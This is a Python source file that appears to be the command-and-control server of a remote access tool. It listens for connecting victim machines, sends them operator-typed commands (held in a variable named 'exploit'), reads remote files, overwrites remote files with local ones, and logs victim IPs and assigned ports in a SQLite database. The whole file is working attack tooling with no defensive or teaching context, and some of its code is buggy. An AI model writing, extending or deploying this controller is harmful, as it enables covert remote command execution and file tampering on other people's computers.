import socket
import time
import sqlite3

crash = None
connections = None
port = 55001

def main_screen():
    print('\n'*20)
    print('  __        __   _                          _ \n',
          ' \ \      / /__| | ___ ___  _ __ ___   ___| | \n',
          "  \ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | \n",
          '   \ V  V /  __/ | (_| (_) | | | | | |  __/_| \n',
          '    \_/\_/ \___|_|\___\___/|_| |_| |_|\___(_) \n',
          '\n',)




class main:
    def __init__(self, HOST, PORT):
        self.HOST = HOST
        self.PORT = PORT
        while True:
            server = socket.socket()
            server.bind((self.HOST, self.PORT))
            print('[+] Server Started')
            print('[+] Listening For Client Connection ...')

            server.listen(1)
            client, client_addr = server.accept()

            os_name = client.recv(1024)
            target_ip = client.recv(1024)

            while True:
                try:
                    try:
                        client.settimeout(10.0)
                        client.send('Up'.encode('utf-8'))
                    except Exception as e:
                        print(e)
                        client.close()
                    client.settimeout(None)

                    exploit = input(f'{target_ip.decode()}@{os_name.decode()}~ ')
                    client.send(exploit.encode('utf-8'))

                    if exploit.startswith('read'):
                        # Receive the number of lines to read
                        lines = int(client.recv(1024).decode('utf-8', errors='replace'))

                        # Loop through each line based on the received number of lines
                        for _ in range(lines):
                            data = client.recv(131072).decode('utf-8', errors='replace')
                            print(f"{data}")
                            client.send(b'OK')  # Send acknowledgment after receiving each line

                        # Final acknowledgment after all lines are processed
                        client.recv(131072).decode('utf-8', errors='replace')
                        continue


                    elif exploit.startswith('edit'):

                        try:
                            local_f = input('Local_File >>> ')
                            remote_f = input('Remote_File >>> ')

                            client.send(remote_f.encode('utf-8'))

                            with open(local_f, 'r') as local_file:
                                lines = local_file.readlines()
                                client.send(str(len(lines)).encode('utf-8'))
                                # Send each line to the client

                                for line in lines:
                                    client.send(line.encode('utf-8'))
                                    ack = client.recv(1024)  # Wait for acknowledgment from the client

                                    if ack != b'OK':
                                        break


                        except Exception as e:
                            print(f'Edit error: {e}')

                        client.recv(131072).decode('utf-8', errors='replace')

                        continue

                    elif exploit.startswith('reconnect'):
                        print('[*] Reconnection')
                        break

                    elif exploit.startswith('exit'):
                        client.recv(131072).decode('utf-8', errors='replace')
                        client.close()
                        break


                    else:
                        length = client.recv(1024).decode('utf-8')
                        length = int(length)
                        received_data = b''

                        while len(received_data) < length:
                            chunk = client.recv(
                                min(131072, length - len(received_data)))

                            if not chunk:
                                break

                            received_data += chunk

                        try:
                            decoded_data = received_data.decode('utf-8', errors='replace')  # Decode if it's text
                            print(decoded_data)

                        except Exception as e:
                            print("Error decoding data:", e)



                except Exception:
                    print('In main class error')


db_name = "sqlite_db.db"

class DATABASE:
    try:
        def __init__(self, DB_NAME, ip=None, port=None):
            self.DB_NAME = DB_NAME
            self.ip = ip
            self.port = port

        def __str__(self):
            print(self.DB_NAME)

        def read_all_db(self):
            with sqlite3.connect(self.DB_NAME) as self.sqlite_conn:
                self.sql_request = "SELECT * FROM users"
                self.sql_cursor = self.sqlite_conn.execute(self.sql_request)
                self.records = self.sql_cursor.fetchall()
                return self.records

        def add_ip(self):
            with sqlite3.connect(self.DB_NAME) as self.sqlite_conn:
                sql_request = "INSERT INTO users VALUES(?, ?, ?)"
                self.sql_request = "SELECT * FROM users"
                self.sql_cursor = self.sqlite_conn.execute(self.sql_request)
                info = (self.sql_cursor.fetchall()[-1][0]+1, self.ip, self.port)
                self.sqlite_conn.execute(sql_request, info)
                self.sqlite_conn.commit()


        def create_tables(self):
            with sqlite3.connect(self.DB_NAME) as self.sqlite_conn:
                sql_request = """CREATE TABLE IF NOT EXISTS users (
                    id integer PRIMARY KEY,
                    ip text NOT NULL,
                    port integer
                );"""
                self.sqlite_conn.execute(sql_request)

        def check_if_ip_in(self, ip=None):
            self.ip = ip
            if self.ip == None:
                print('Error: No ip was given!')

            with sqlite3.connect(self.DB_NAME) as self.sqlite_conn:
                self.sql_request = "SELECT * FROM users"
                self.sql_cursor = self.sqlite_conn.execute(self.sql_request)
                self.records = self.sql_cursor.fetchall()
                for user in self.records:
                    if self.ip == user[1]:
                        return True
                    else:
                        continue
                return False



    except Exception as err:
        crash = 2
        print(f'Crash report {crash} | {err}')


def scan_for_connections():
    while True:
        try:
            HOST = input("IP>>>")
            PORT = 55001

            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((HOST, PORT))
            server.listen()

            print(f"[SERVER] Listening on {HOST}:{PORT}")

            found = 0

            while True:
                conn, addr = server.accept()
                if DATABASE(db_name).check_if_ip_in(addr[0]):
                    for search_for_address in DATABASE(db_name).read_all_db():
                        if search_for_address[1] == addr[0]:
                            conn.send(f'{search_for_address[2]}'.encode('utf-8'))
                            print(f"[CONNECTED] {addr[0]}:{search_for_address[2]}")
                            found = 1
                            break

                    if found == 0:
                        ports = DATABASE(db_name).read_all_db()[-1][2] + 1
                        DATABASE(db_name, addr[0], ports).add_ip()
                        conn.send(ports) # ip too
                        print(f"[CONNECTED] {addr[0]}:{ports}")

        except KeyboardInterrupt:
            print('BACK')
            break


        except Exception as e:
            print('IP is not valid')
            continue





if __name__ == "__main__":
    #DATABASE(db_name).create_tables()   creates tabel
    #DATABASE(db_name, '127.0.0.1', 55003).add_ip()   add new ip
    #DATABASE(db_name).read_all_db()   prints all ips

    main_screen()

    try:
        while True:
            option = input(f'| 1-Auto Port({port}) | 2-All IPS | 3-Manual Connection | 4-Create DB | 5-SCAN FOR CONNECTIONS\n>>> ')
            if option == '1':
                connections = input(' IP >>> ')
                try:
                    while True:
                        main(connections, port)
                        print('Done')
                except Exception as err:
                    crash = 1
                    print(f'Crash report {crash} | {err}')

            elif option == '2':
                print(f"ID |     IP     | PORT")
                for id, ip, port in DATABASE(db_name).read_all_db():
                    print(f"{id}  | {ip}  | {port}")
                print('\n')
                continue

            elif option == '3':
                connections = input(' IP >>> ')
                while True:
                    try:
                        port = int(input(' PORT >>> '))
                        break
                    except Exception:
                        print('Enter port in range 400-63000')
                        continue

                try:
                    while True:
                        main(connections, port)
                        print('Done')
                except Exception as err:
                    crash = 1
                    print(f'Crash report {crash} | {err}')

            elif option == '4':
                try:
                    with open(db_name, 'r') as check:
                        print(f'DB name: {db_name} already exist!')
                except FileNotFoundError:
                    print(f'DB name: {db_name} was created!')
                    DATABASE(db_name).create_tables()

            elif option == '5':
                try:
                    scan_for_connections()
                except KeyboardInterrupt:
                    continue

    except KeyboardInterrupt:
        print('EXIT')

#crash reports codes
# 1 - main class crash
# 2 - DATABASE class crash


#сосдати метод додавання нових айпи x перевірка статуса
